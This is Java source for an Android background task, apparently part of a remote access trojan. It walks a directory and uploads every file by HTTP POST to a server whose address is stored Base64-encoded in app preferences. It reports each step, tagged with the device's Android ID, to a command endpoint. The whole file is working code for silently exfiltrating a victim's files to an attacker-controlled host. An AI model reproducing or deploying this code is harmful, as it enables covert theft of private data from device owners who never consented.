package com.asynctask;

import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Base64;
import android.util.Log;

import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Created by Conan0xff on 2017/12/7.
 */

public class uploadFiles extends AsyncTask<String, Void, String> {
    String j = "";
    String i = "";

    public uploadFiles(String j, String i) {
        this.j = j;
        this.i = i;
    }

    @Override
    protected String doInBackground(String... params) {

        File sd = new File(j);
        if (sd.exists()) {
            File[] sdDirList = sd.listFiles();
            for (int k = 0; k < sdDirList.length; k++) {
                try {
                    String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
                    CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Uploading:" + sdDirList[k].toString());
                } catch (UnsupportedEncodingException e) {

                    e.printStackTrace();
                }

                HttpURLConnection connection = null;
                DataOutputStream outputStream = null;
                DataInputStream inputStream = null;

                String pathToOurFile = sdDirList[k].toString();
                String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
                String urlServer = URL + i;

                Log.i("com.connect", "pathToOurFile : " + pathToOurFile);
                Log.i("com.connect", "urlServer : " + urlServer);


                String lineEnd = "\r\n";
                String twoHyphens = "--";
                String boundary = "*****";
                int bytesRead, bytesAvailable, bufferSize;
                byte[] buffer;
                int maxBufferSize = 1 * 1024 * 1024 * 1000 * 10;

                try {
                    FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile));

                    URL url = new URL(urlServer);
                    connection = (HttpURLConnection) url.openConnection();

                    // Allow Inputs & Outputs
                    connection.setDoInput(true);
                    connection.setDoOutput(true);
                    connection.setUseCaches(false);

                    // Enable POST method
                    connection.setRequestMethod("POST");

                    connection.setRequestProperty("Connection", "Keep-Alive");
                    connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                    outputStream = new DataOutputStream(connection.getOutputStream());
                    outputStream.writeBytes(twoHyphens + boundary + lineEnd);
                    outputStream.writeBytes("Content-Disposition: form-data; name=\"file\";filename=\"" + pathToOurFile + "\"" + lineEnd);
                    outputStream.writeBytes(lineEnd);

                    bytesAvailable = fileInputStream.available();
                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
                    buffer = new byte[bufferSize];

                    // Read file
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);

                    while (bytesRead > 0) {
                        outputStream.write(buffer, 0, bufferSize);
                        bytesAvailable = fileInputStream.available();
                        bufferSize = Math.min(bytesAvailable, maxBufferSize);
                        bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                    }

                    outputStream.writeBytes(lineEnd);
                    outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                    // Responses from the server (code and message)
                    int serverResponseCode = connection.getResponseCode();
                    String serverResponseMessage = connection.getResponseMessage();
                    fileInputStream.close();
                    outputStream.flush();
                    outputStream.close();
                    CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Uploading:" + sdDirList[k].toString() + " Complete");
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        }
        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {
        try {
            PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Files", false).commit();
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Files Uploaded");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }

    @Override
    protected void onPreExecute() {
        try {
//                while (PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getBoolean("Files", false) == true) {
//                    try {
//                        Thread.sleep(5000);
//                    } catch (InterruptedException e) {
//                        e.printStackTrace();
//                    }
//                }
            PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Files", true).commit();
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Uploading Files");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
